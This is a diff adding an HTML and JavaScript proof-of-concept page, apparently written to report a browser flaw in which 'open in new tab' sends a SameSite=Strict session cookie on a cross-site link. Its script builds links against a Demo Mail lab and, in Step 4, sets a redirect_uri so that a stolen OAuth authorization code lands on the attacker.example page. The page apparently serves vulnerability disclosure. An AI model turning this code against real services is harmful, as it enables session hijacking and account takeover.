@@ -1,0 +1,137 @@
+<!doctype html>
+<html lang="en">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="referrer" content="unsafe-url">
+<title>attacker.example — unrelated third-party site</title>
+<style>
+ :root{color-scheme:dark}
+ body{margin:0;padding:18px;background:#0b0d12;color:#e9ecf3;max-width:720px;
+      font:16px/1.55 -apple-system,BlinkMacSystemFont,system-ui,sans-serif}
+ h1{font-size:20px;margin:0 0 2px}
+ .note{font-size:13.5px;opacity:.7;margin:0 0 16px}
+ .step{background:#141a26;border-radius:14px;padding:16px;margin:0 0 14px;
+       border-left:4px solid #4a8fe8}
+ .step.bug{border-left-color:#ff4d6a}
+ .n{font-size:11.5px;letter-spacing:1.4px;text-transform:uppercase;opacity:.55;
+    font-weight:700;margin:0 0 6px}
+ a.t{display:inline-block;font-size:19px;font-weight:700;color:#7fb0ff;
+     text-decoration:none;word-break:break-all;margin:2px 0 8px}
+ .how{display:inline-block;background:#23304a;border-radius:6px;padding:3px 9px;
+      font-size:11.5px;font-weight:700;letter-spacing:.4px;color:#a8c4ee;margin:0 6px 6px 0}
+ .exp{font-size:13.5px;margin:4px 0 0;opacity:.85}
+ .id{font-size:12px;opacity:.5;margin:6px 0 0}
+ input{background:#070910;border:1px solid #273048;color:#e9ecf3;border-radius:8px;
+       padding:8px 10px;font:13px ui-monospace,Menlo,monospace;width:100%;box-sizing:border-box}
+ code{font-family:ui-monospace,Menlo,monospace;font-size:12.5px}
+ #warn{background:#86101f;box-shadow:inset 0 0 0 3px #ff4d6a;border-radius:12px;
+       padding:16px;margin:12px 0;display:none}
+ #got{background:#86101f;box-shadow:inset 0 0 0 3px #ff4d6a;border-radius:12px;
+      padding:16px;margin:12px 0;display:none}
+ .ok{color:#35d07f}.bad{color:#ff4d6a}
+</style>
+
+<h1>attacker.example</h1>
+<p class="note">A site with no relationship to Demo Mail. Different registrable domain,
+so every link below is a cross-site navigation.</p>
+
+<label class="note" for="base">Demo Mail origin</label>
+<input id="base" value="https://1.hackeronce.com">
+
+<div id="warn"><b>STOP — this page is same-site with the target.</b>
+<p style="margin:6px 0 0;font-size:14px">Serve it from a different registrable domain or
+every result is meaningless.</p></div>
+
+<div id="got"><b>Authorization code received by attacker.example:</b>
+<div style="margin-top:6px"><code id="gotcode"></code></div></div>
+
+<div class="step">
+  <p class="n">Step 1 · control</p>
+  <a class="t" data-p="/inbox" data-tag="step1-ordinary-tap">Open Demo Mail inbox</a>
+  <p><span class="how">TAP THE LINK NORMALLY</span></p>
+  <p class="exp">Expected and correct: <span class="ok">SIGNED OUT</span>. The
+  <code>SameSite=Strict</code> session cookie is withheld on a cross-site navigation.</p>
+  <p class="id">Test ID: <code class="nid">—</code></p>
+</div>
+
+<div class="step bug">
+  <p class="n">Step 2 · the issue</p>
+  <a class="t" data-p="/inbox" data-tag="step2-open-in-new-tab">Open Demo Mail inbox</a>
+  <p><span class="how">TOUCH &amp; HOLD → OPEN IN NEW TAB</span></p>
+  <p class="exp">Same link, same URL, same session. Observed:
+  <span class="bad">SIGNED IN</span> — the Strict session cookie is attached, and the page
+  renders private account data.</p>
+  <p class="id">Test ID: <code class="nid">—</code></p>
+</div>
+
+<div class="step bug">
+  <p class="n">Step 3 · reload proves the tab knows better</p>
+  <a class="t" data-p="/inbox" data-tag="step3-reload-after">(use the Step 2 tab)</a>
+  <p><span class="how">IN THE TAB FROM STEP 2, PULL TO REFRESH</span></p>
+  <p class="exp">The same URL in the same tab now reports
+  <code>Sec-Fetch-Site: cross-site</code> and goes back to
+  <span class="ok">SIGNED OUT</span>. The cross-site relationship is known — it is lost
+  only while the tab is being created.</p>
+</div>
+
+<div class="step bug">
+  <p class="n">Step 4 · impact</p>
+  <a class="t" data-p="/authorize" data-tag="step4-code-theft" data-auth="1">Continue to Demo Mail</a>
+  <p><span class="how">TOUCH &amp; HOLD → OPEN IN NEW TAB</span></p>
+  <p class="exp">An OAuth-style endpoint that issues an authorization code only to an
+  authenticated session. Opened this way it authenticates, mints a code, and redirects it
+  to attacker.example — which displays it at the top of this page.</p>
+  <p class="id">Test ID: <code class="nid">—</code></p>
+</div>
+
+<script>
+(function () {
+  var base = document.getElementById('base');
+  function origin() { return base.value.replace(/\/+$/, ''); }
+  var collector = location.origin + location.pathname.replace(/[^\/]*$/, '') + 'asb_callback.html';
+
+  function mk(a) {
+    var n = Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
+    var u = origin() + a.dataset.p + '?tag=' + encodeURIComponent(a.dataset.tag) + '&n=' + n;
+    if (a.dataset.auth) {
+      u += '&redirect_uri=' + encodeURIComponent(collector + '?lab=' + encodeURIComponent(origin()));
+    }
+    a.href = u;
+    var el = a.parentNode.querySelector('.nid') ||
+             (a.closest('.step') && a.closest('.step').querySelector('.nid'));
+    if (el) el.textContent = n;
+  }
+  var links = [].slice.call(document.querySelectorAll('a.t[data-p]'));
+
+  function reg(h) { var p = h.split('.'); return p.length <= 2 ? h : p.slice(-2).join('.'); }
+  function guard() {
+    var w = document.getElementById('warn');
+    try { w.style.display = reg(new URL(origin()).hostname) === reg(location.hostname)
+                            ? 'block' : 'none'; }
+    catch (e) { w.style.display = 'none'; }
+  }
+  function refresh() { links.forEach(mk); guard(); }
+  refresh();
+  base.addEventListener('input', refresh);
+  ['pointerdown', 'contextmenu', 'touchstart'].forEach(function (ev) {
+    document.addEventListener(ev, function (e) {
+      var a = e.target.closest && e.target.closest('a.t[data-p]'); if (a) mk(a);
+    }, true);
+  });
+
+  function show(c) {
+    document.getElementById('got').style.display = 'block';
+    document.getElementById('gotcode').textContent = c;
+  }
+  try {
+    var seen = localStorage.getItem('asb_code');
+    if (seen) show(seen);
+    new BroadcastChannel('asb_poc').onmessage = function (e) {
+      if (e.data && e.data.code) show(e.data.code);
+    };
+    addEventListener('storage', function (e) {
+      if (e.key === 'asb_code' && e.newValue) show(e.newValue);
+    });
+  } catch (e) {}
+})();
+</script>
